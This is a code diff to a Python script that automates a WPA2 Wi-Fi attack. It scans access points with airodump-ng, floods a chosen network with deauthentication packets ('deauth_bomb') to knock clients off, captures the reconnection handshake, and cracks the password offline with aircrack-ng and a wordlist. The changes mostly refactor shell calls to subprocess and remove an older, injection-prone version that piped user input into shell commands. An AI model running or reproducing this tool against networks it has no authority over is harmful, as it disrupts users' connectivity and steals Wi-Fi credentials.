@@ -49,18 +49,13 @@ def network_setup(int_name):
 
 def network_teardown(int_name):
     try:
-        os.system("airmon-ng stop %s" %int_name)
-        os.system("service network-manager restart")
+        #os.system("airmon-ng stop %s" %int_name)
+        out = subprocess.check_output("airmon-ng stop {}".format(int_name).split(" "))
+        #os.system("service network-manager restart")
+        out = subprocess.check_output("service network-manager restart".split(" "))
     except NameError:
         print("Network Interface \"%s\" does not exist" %int_name)
 
-"""
-def network_sniff(interface_name):
-    try:
-        os.system("airodump-ng -a -w testcap %s" %interface_name)
-    except KeyboardInterrupt:
-        print ("Network sniffing done")
-"""
 def get_bssids(interface_name):
     print('getting bssids')
     p = subprocess.Popen("airodump-ng -a -w testcap -t WPA2 {}".format(interface_name).split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -76,8 +71,8 @@ def get_bssids(interface_name):
             out2 += os.read(fd, 2048)
 
     _poll.unregister(p.stderr)
-    p.terminate()
-    #p.send_signal(signal.SIGINT)
+    #p.terminate()
+    p.send_signal(signal.SIGINT)
 
     bssid_map = {}
     processes = []
@@ -117,16 +112,9 @@ def get_bssids(interface_name):
                 bssid_map[bssid["BSSID"]] = bssid
                 print(bssid["ESSID"])
 
-    """
-    print("found bssids")
-    for key in bssid_map.keys():
-        print("")
-        print(bssid_map[key]["ESSID"])
-        capture_handshake(bssid_map[key], interface_name)
-    """
     return bssid_map
 
-def deauth_bomb2(bssid, channel, int_name, number_deauth_packets):
+def deauth_bomb(bssid, channel, int_name, number_deauth_packets):
     try:
         #cmd = "iwconfig " + int_name + " channel " + channel
         #print(cmd)
@@ -145,41 +133,21 @@ def deauth_bomb2(bssid, channel, int_name, number_deauth_packets):
     except KeyboardInterrupt:
         return bssid
 
-def deauth_bomb(int_name, number_deauth_packets):
-    try:
-        ssid_name = str(raw_input("Input the first 3 characters of the ssid you are targetting (Case Sensitive): "))
-
-        cmd = "cat testcap-01.csv | grep " + ssid_name + " | awk '{print $1}' | awk -F',' 'NR==1{print $1}'"
-        bssid = str(os.popen(cmd).read()).strip('\n')
-
-        cmd = "cat testcap-01.csv | grep " + bssid + " | awk '{print $6}' | awk -F',' 'NR==1{print $1}'"
-        channel = str(os.popen(cmd).read()).split('\n')[0]
-
-        cmd = "iwconfig " + int_name + " channel " + channel
-        print(cmd)
-        os.system(cmd)
-
-        cmd = "aireplay-ng -0 " + str(number_deauth_packets) + " -a " + bssid + " " + int_name
-        print(cmd)
-        subprocess.call(cmd, shell=True)
-        return bssid, channel
-
-    except KeyboardInterrupt:
-        return bssid
-
 def capture_handshake(bssid, int_name, channel):
     try:
-        os.system("airodump-ng --bssid %s --channel %s -w captured_packet %s" %(bssid, channel, int_name))
+        #os.system("airodump-ng --bssid %s --channel %s -w captured_packet %s" %(bssid, channel, int_name))
+        cmd = "airodump-ng --bssid {0} --channel {1},{1} -w handshake_{0} {2}".format(bssid, channel, int_name)
+        p = subprocess.Popen(cmd.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        time.sleep(5)
+        p.send_signal(signal.SIGINT)
+
     except KeyboardInterrupt:
         print ("nothing")
 
 if __name__ == "__main__":
 
     os.system("rm testcap*")
-    os.system("rm captured*")
-    #os.system("iwconfig")
-
-    #interface_name = raw_input("Input the name of your wireless interface: ")
+    os.system("rm handshake*")
 
     #print ("\nSetting up Nic Parameters")
     #int_name = network_setup(interface_name)
@@ -201,7 +169,7 @@ if __name__ == "__main__":
 
     #print ("\nWith user input, sending De-Auth bomb")
     #bssid, channel = deauth_bomb(int_name, number_deauth_packets)
-    bssid, channel = deauth_bomb2(bssid["BSSID"], bssid["CH"], int_name, number_deauth_packets)
+    bssid, channel = deauth_bomb(bssid["BSSID"], bssid["CH"], int_name, number_deauth_packets)
     print("bssid:{0}\tchannel:{1}".format(bssid, channel))
 
     #print ("Capturing 4-way handshake, targeting " + str(bssid))
@@ -210,5 +178,7 @@ if __name__ == "__main__":
     #print("\nResetting Nic Parameters and restarting Network-Manager.\n")
     network_teardown(int_name)
 
-    cmd = "aircrack-ng -w test.txt -b " + bssid + " captured_packet-01.cap"
+    print("cracking password for bssid: {}".format(bssid))
+    #cmd = "aircrack-ng -w test.txt -b " + bssid + " captured_packet-01.cap"
+    cmd = "aircrack-ng -w test.txt -b {0} handshake_{0}-01.cap".format(bssid)
     subprocess.call(cmd, shell=True)
